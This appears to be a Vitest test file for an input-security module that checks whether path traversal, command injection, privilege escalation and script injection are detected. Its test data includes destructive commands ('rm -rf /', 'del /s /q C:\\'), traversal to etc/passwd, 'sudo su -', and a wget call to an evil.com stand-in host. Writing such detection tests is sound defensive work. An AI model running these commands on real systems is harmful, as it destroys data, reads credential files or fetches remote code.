/**
 * Comprehensive edge case testing for security features in subtasks 1.1.1 and 1.1.2
 * Tests complex scenarios, boundary conditions, and potential security vulnerabilities
 */

import { describe, it, expect } from 'vitest';
import { ERROR_MESSAGES } from '../../core/foundation/constants.js';
import { 
  analyzeInputSecurity,
  sanitizeInput,
  isPathSafe,
  isCommandSafe,
  isProjectNameSafe
} from '../../core/foundation/security-patterns.js';

describe('Security Comprehensive Edge Cases', () => {
  describe('ERROR_MESSAGES Edge Cases', () => {
    it('should handle extremely long path names', () => {
      const longPath = 'a'.repeat(1000) + '/' + '../'.repeat(100) + 'etc/passwd';
      const result = ERROR_MESSAGES.INVALID_COMMAND_PATH(longPath);
      expect(result).toContain('Invalid or unsafe commands directory path');
      expect(result).toContain('Command paths must be within the current working directory');
    });

    it('should handle special characters in command names', () => {
      const specialChars = '!@#$%^&*()[]{}|\\:";\'<>?,./ ';
      const result = ERROR_MESSAGES.COMMAND_NAME_CONFLICT(
        specialChars,
        '/path/to/file1.js',
        './commands1',
        '/path/to/file2.js', 
        './commands2'
      );
      expect(result).toContain(`Command name conflict: '${specialChars}'`);
      expect(result).toContain('Please rename one of the commands');
    });

    it('should handle Unicode characters in security messages', () => {
      const unicodeInput = '测试路径/../../etc/passwd';
      const unicodePattern = 'Unicode字符模式';
      const result = ERROR_MESSAGES.SUSPICIOUS_INPUT_DETECTED(unicodeInput, unicodePattern);
      expect(result).toContain(unicodeInput);
      expect(result).toContain(unicodePattern);
      expect(result).toContain('security pattern');
    });

    it('should handle empty and whitespace-only inputs', () => {
      const emptyResult = ERROR_MESSAGES.MALICIOUS_PATH_DETECTED('', 'empty path');
      expect(emptyResult).toContain('Malicious path detected: ""');
      
      const whitespaceResult = ERROR_MESSAGES.COMMAND_INJECTION_ATTEMPT('   \t\n   ');
      expect(whitespaceResult).toContain('Command injection attempt detected');
    });

    it('should handle null-like strings in parameters', () => {
      const nullString = 'null';
      const undefinedString = 'undefined';
      
      const result1 = ERROR_MESSAGES.UNSAFE_TEMPLATE_SOURCE(nullString);
      expect(result1).toContain('Template source not whitelisted: null');
      
      const result2 = ERROR_MESSAGES.SCRIPT_EXECUTION_BLOCKED(undefinedString);
      expect(result2).toContain('Script execution blocked for security: undefined');
    });
  });

  describe('Security Patterns Edge Cases', () => {
    it('should handle mixed encoding attacks', () => {
      const mixedAttack = '../%2e%2e/%2f..\\..\\etc/passwd';
      const result = analyzeInputSecurity(mixedAttack);
      
      expect(result.isSecure).toBe(false);
      expect(result.riskScore).toBeGreaterThan(30);
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0].type).toBe('path-traversal');
    });

    it('should handle Unicode normalization attacks', () => {
      // Unicode normalization can sometimes bypass filters
      const unicodeNormalized = '\u002e\u002e\u002f\u002e\u002e\u002f';
      const result = analyzeInputSecurity(unicodeNormalized);
      
      // Should detect Unicode traversal
      expect(result.isSecure).toBe(false);
      expect(result.violations.some(v => v.type === 'path-traversal')).toBe(true);
    });

    it('should handle polyglot attacks (multiple attack types)', () => {
      const polyglot = '../../etc/passwd; rm -rf /; eval("alert(1)"); sudo su -';
      const result = analyzeInputSecurity(polyglot);
      
      expect(result.isSecure).toBe(false);
      expect(result.riskScore).toBeGreaterThan(80); // Very high risk
      expect(result.violations.length).toBeGreaterThan(2); // Multiple attack types
      
      const violationTypes = result.violations.map(v => v.type);
      expect(violationTypes).toContain('path-traversal');
      expect(violationTypes).toContain('command-injection');
      expect(violationTypes).toContain('privilege-escalation');
    });

    it('should handle extremely long inputs without performance issues', () => {
      const start = performance.now();
      const longInput = 'safe-input-'.repeat(10000);
      const result = analyzeInputSecurity(longInput);
      const end = performance.now();
      
      expect(end - start).toBeLessThan(1000); // Should complete within 1 second
      expect(result.isSecure).toBe(true);
      expect(result.sanitizedInput).toBeDefined();
    });

    it('should handle null bytes in various positions', () => {
      const nullByteTests = [
        '../../etc/passwd\x00.txt',
        '\x00../../etc/passwd',
        '../..\x00/etc/passwd',
        'safe-path\x00; rm -rf /'
      ];

      nullByteTests.forEach(test => {
        const result = analyzeInputSecurity(test);
        expect(result.isSecure).toBe(false);
      });
    });

    it('should handle case variations in dangerous commands', () => {
      const caseVariations = [
        'RM -rf /',
        'Sudo su -',
        'EVAL("code")',
        'dEl /s /q C:\\',
        'WgEt http://evil.com/script'
      ];

      caseVariations.forEach(cmd => {
        const result = isCommandSafe(cmd);
        expect(result).toBe(false);
      });
    });
  });

  describe('Sanitization Edge Cases', () => {
    it('should handle nested sanitization requirements', () => {
      const nestedAttack = '..\\..\\$(eval("../../etc/passwd"))';
      const sanitized = sanitizeInput(nestedAttack);
      
      // Should remove both path traversal and script injection
      expect(sanitized).not.toContain('..');
      expect(sanitized).not.toContain('eval');
      expect(sanitized.length).toBeLessThan(nestedAttack.length);
    });

    it('should preserve legitimate shell escaping', () => {
      const legitimateEscape = 'echo "Hello\\nWorld"';
      const result = isCommandSafe(legitimateEscape);
      // This might be safe depending on context - test current behavior
      const analysis = analyzeInputSecurity(legitimateEscape);
      expect(analysis.violations.length).toBeGreaterThanOrEqual(0);
      // Verify the result is defined
      expect(typeof result).toBe('boolean');
    });

    it('should handle Windows vs Unix path separators', () => {
      const windowsTraversal = '..\\..\\windows\\system32\\cmd.exe';
      const unixTraversal = '../../etc/passwd';
      
      expect(isPathSafe(windowsTraversal)).toBe(false);
      expect(isPathSafe(unixTraversal)).toBe(false);
    });

    it('should handle encoded path separators', () => {
      const encodedPaths = [
        '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%5c%2e%2e%5cwindows%5csystem32',
        '..%252f..%252fetc%252fpasswd'
      ];

      encodedPaths.forEach(path => {
        const result = analyzeInputSecurity(path);
        expect(result.isSecure).toBe(false);
      });
    });
  });

  describe('Boundary Condition Testing', () => {
    it('should handle empty and single-character inputs', () => {
      const boundaryInputs = ['', '.', '/', '\\', ';', '|', '&', '$', '`'];
      
      boundaryInputs.forEach(input => {
        expect(() => analyzeInputSecurity(input)).not.toThrow();
        expect(() => sanitizeInput(input)).not.toThrow();
        expect(() => isPathSafe(input)).not.toThrow();
        expect(() => isCommandSafe(input)).not.toThrow();
        expect(() => isProjectNameSafe(input)).not.toThrow();
      });
    });

    it('should handle maximum-length project names', () => {
      const maxLength = 'a'.repeat(255); // Common filename max length
      const overLength = 'a'.repeat(256);
      
      const maxResult = isProjectNameSafe(maxLength);
      const overResult = isProjectNameSafe(overLength);
      
      expect(maxResult).toBe(true);
      // Over-length might still be considered safe by pattern but caught by other validation
      expect(typeof overResult).toBe('boolean');
    });

    it('should handle regex pattern edge cases', () => {
      // Test patterns that might cause ReDoS (Regular expression Denial of Service)
      const regexStressTests = [
        '('.repeat(100) + ')'.repeat(100),
        '['.repeat(50) + ']'.repeat(50), 
        '.*'.repeat(100),
        'a'.repeat(1000) + '$'
      ];

      regexStressTests.forEach(test => {
        const start = performance.now();
        const result = analyzeInputSecurity(test);
        const end = performance.now();
        
        expect(end - start).toBeLessThan(5000); // Should not hang for more than 5 seconds
        expect(result).toBeDefined();
      });
    });
  });

  describe('Security Risk Assessment', () => {
    it('should properly calculate cumulative risk scores', () => {
      const lowRisk = 'my-safe-project';
      const mediumRisk = '../parent-dir';
      const highRisk = '../../etc/passwd';
      const criticalRisk = '../../etc/passwd; rm -rf /; sudo su -; eval("malicious")';
      
      const lowResult = analyzeInputSecurity(lowRisk);
      const mediumResult = analyzeInputSecurity(mediumRisk);
      const highResult = analyzeInputSecurity(highRisk);
      const criticalResult = analyzeInputSecurity(criticalRisk);
      
      expect(lowResult.riskScore).toBe(0);
      expect(mediumResult.riskScore).toBeGreaterThan(0);
      expect(highResult.riskScore).toBeGreaterThan(mediumResult.riskScore);
      expect(criticalResult.riskScore).toBeGreaterThan(highResult.riskScore);
      expect(criticalResult.riskScore).toBeLessThanOrEqual(100);
    });

    it('should provide meaningful recommendations', () => {
      const dangerousInput = 'rm -rf /';
      const result = analyzeInputSecurity(dangerousInput);
      
      expect(result.violations).toHaveLength(1);
      expect(result.violations[0].recommendation).toContain('safe alternatives');
      expect(result.violations[0].severity).toBe('critical');
    });

    it('should handle violation categorization correctly', () => {
      const testCases = [
        { input: '../../../etc/passwd', expectedType: 'path-traversal' },
        { input: 'rm -rf /', expectedType: 'command-injection' },
        { input: 'sudo su -', expectedType: 'privilege-escalation' },
        { input: 'eval("code")', expectedType: 'script-injection' }
      ];

      testCases.forEach(({ input, expectedType }) => {
        const result = analyzeInputSecurity(input);
        expect(result.violations.some(v => v.type === expectedType)).toBe(true);
      });
    });
  });

  describe('Input Validation Consistency', () => {
    it('should be consistent between different validation functions', () => {
      const testInputs = [
        'safe-project-name',
        '../unsafe-path',
        'rm -rf /',
        'normal/path/to/file.txt'
      ];

      testInputs.forEach(input => {
        const analysisResult = analyzeInputSecurity(input);
        const pathSafeResult = isPathSafe(input);
        const commandSafeResult = isCommandSafe(input);
        
        // If analysis says it's secure, other functions should generally agree
        if (analysisResult.isSecure && analysisResult.riskScore === 0) {
          expect(pathSafeResult).toBe(true);
          expect(commandSafeResult).toBe(true);
        }
      });
    });

    it('should handle function parameter validation', () => {
      // Test with null, undefined, and non-string inputs
      const invalidInputs = [null, undefined, 123, {}, [], true];
      
      invalidInputs.forEach(input => {
        expect(() => analyzeInputSecurity(input as any)).not.toThrow();
        expect(() => sanitizeInput(input as any)).not.toThrow();
        expect(() => isPathSafe(input as any)).not.toThrow();
        expect(() => isCommandSafe(input as any)).not.toThrow();
        expect(() => isProjectNameSafe(input as any)).not.toThrow();
      });
    });
  });
});
